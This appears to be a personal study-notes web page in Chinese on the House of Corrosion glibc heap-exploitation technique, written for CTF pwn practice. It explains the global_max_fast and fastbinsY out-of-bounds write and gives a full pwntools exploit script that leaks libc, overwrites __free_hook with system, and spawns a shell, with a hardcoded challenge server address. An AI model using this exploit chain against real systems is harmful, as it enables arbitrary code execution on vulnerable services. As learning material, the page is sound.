<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># House of Corrosion,House of Corrosion</title>
    <link rel="stylesheet" href="../../../../assets/css/notes.min.css">
</head>
<body>
    <div id="header-placeholder"></div>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>House of Corrosion</h1>
<h2>1.基本原理</h2>
<p>利用 malloc 和 free 过程中对 fastbinsY 数组边界检查不严格，通过修改 global_max_fast 为一个很大的值，造成 fastbinsY 数组越界，最终导致任意地址写的一种堆利用手法。fastbin 默认 size 是在 [0x20, 0x80]</p>
<p><img src="/0101/PWN/堆利用/House/assets/9.House_of_Corrosion/image-20250415230610660.png" alt="image-20250415230610660"></p>
<p>这里的 size 是 chunk（实际大小，包括 chunk 头）的大小，因为 fastbin 的 size 与 fastbinsY [?] 中的值是一一对应的，fastbinsY [?] 指向该 size 大小的 chunk，fastbin 起始大小为 0x20，chunk 的大小是 0x10 递增的，fastbinY [?] 中的每个值占 0x8 字节，所以可以得到公式 &amp;fastbinsY + (size - 0x20)/2 = &amp;target，转化后即可得到上式</p>
<p>在 glibc-2.27 中增加了对 global_max_fast 的检测，但实际上汇编分析可以发现该检测被优化调了：</p>
<pre><code class="language-c">static inline INTERNAL_SIZE_T
get_max_fast (void)
{
  /* Tell the GCC optimizers that global_max_fast is never larger
     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in
     _int_malloc after constant propagation of the size parameter.
     (The code never executes because malloc preserves the
     global_max_fast invariant, but the optimizers may not recognize
     this.)  */
  if (global_max_fast &gt; MAX_FAST_SIZE)
    __builtin_unreachable ();
  return global_max_fast;
}
</code></pre>
<p>在 glibc-2.37 版本中，global_max_fast 的数据类型被修改为了 int8_u，进而导致可控的空间范围大幅度缩小，最大只能为 0xff</p>
<h2>2.利用思路</h2>
<p>exp：</p>
<pre><code class="language-python">from pwn import *

elf_path = './pwn'
libc_path = './libc.so.6'
elf = ELF(elf_path, checksec=False)
libc = ELF(libc_path)
context(arch=elf.arch, os=elf.os, log_level=&quot;debug&quot;)
# context.terminal = ['tmux','splitw','-h']
ip = '8.147.135.93'
port = 37051

local = 1
if local:
    p = process([elf_path])
else:
    p = remote(ip, port)

#-----------------------------------------------------------------------------------------
it      = lambda                    : p.interactive()
sd      = lambda data               : p.send((data))
sa     	= lambda delim,data         : p.sendafter((delim), (data))
sl      = lambda data               : p.sendline((data))
sla     = lambda delim,data         : p.sendlineafter((delim), (data))
r       = lambda numb=4096          : p.recv(numb)
ru      = lambda delims, drop=False : p.recvuntil(delims, drop)
rl      = lambda                    : p.recvline()
l       = lambda str1               : log.success(str1)
li      = lambda str1,data1         : log.success(str1+' ========&gt; '+hex(data1))
uu32    = lambda data               : u32(data.ljust(4, b&quot;\x00&quot;))
uu64    = lambda data               : u64(data.ljust(8, b&quot;\x00&quot;))
n64     = lambda x                  : (x + 0x10000000000000000) &amp; 0xFFFFFFFFFFFFFFFF
u32Leakbase = lambda offset         : u32(ru(b&quot;\xf7&quot;)[-4:]) - offset
u64Leakbase = lambda offset         : u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - offset
dbg     = lambda                    : gdb.attach(p) / pause()
#-----------------------------------------------------------------------------------------

def add_chunk(index, size):
    sla(b&quot;choice:\n&quot;, b&quot;1&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;size:\n&quot;, str(size).encode())

def delete_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;2&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def edit_chunk(index, content):
    sla(b&quot;choice:\n&quot;, b&quot;3&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;length:\n&quot;, str(len(content)).encode())
    sa(b&quot;content:\n&quot;, content)

def show_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;4&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def exit_p():
    sla(b&quot;choice:\n&quot;, b&quot;5&quot;)

add_chunk(0, 0x428)
add_chunk(1, 0x18)
add_chunk(2, 0x418)
add_chunk(3, 0x18)

delete_chunk(0)
show_chunk(0)
libc.address = u64Leakbase(0x39bb78)
li(&quot;libc.address&quot;, libc.address)

add_chunk(10, 0x500)
edit_chunk(0, p64(0)*3 + p64(libc.sym['global_max_fast'] - 0x20))
delete_chunk(2)
add_chunk(10, 0x500)

add_chunk(4, (libc.sym['__free_hook'] - (libc.sym['main_arena'] + 8)) * 2 + 0x10)
delete_chunk(4)
edit_chunk(4, p64(libc.sym['system']))
add_chunk(4, (libc.sym['__free_hook'] - (libc.sym['main_arena'] + 8)) * 2 + 0x10)
edit_chunk(10, b'/bin/sh\x00')
delete_chunk(10)
# dbg()
it()
</code></pre>
<p>前面适用 largebinattack2 对 global_max_fast 进行修改为一个较大的值，那么后面释放的 chunk 基本都进入了 fastbin（pwndbg 因为错误识别不出来其进入了 fastbin），并在 fastbinsY 数组中保存了其首地址，那么 <code>__free_hook</code> 此时保存的是释放的 chunk 的地址，将该 chunk 的 fd 修改为 system 函数地址，那么将该 chunk 申请出来后 <code>__free_hook</code> 处也就成功写入了 system 的地址</p>
<p>在对 size 大小进行申请时，其大小应该比上述公式小 0x10，因为在内存中进行 chunk 分配时，还会分配上 chunk 头的 0x10 字节</p>
<p>fastbinsY 数组距离 main_arena8 字节长</p>
<p><img src="/0101/PWN/堆利用/House/assets/9.House_of_Corrosion/image-20250415233527068.png" alt="image-20250415233527068"></p>

        </main>
    </div>
    <footer class="footer">
        <p>&copy; 2024 waiwai24. All rights reserved.</p>
    </footer>
    <script src="../../../../assets/js/header.js"></script>
    <script src="../../../../assets/js/include-header.js"></script>
</body>
</html>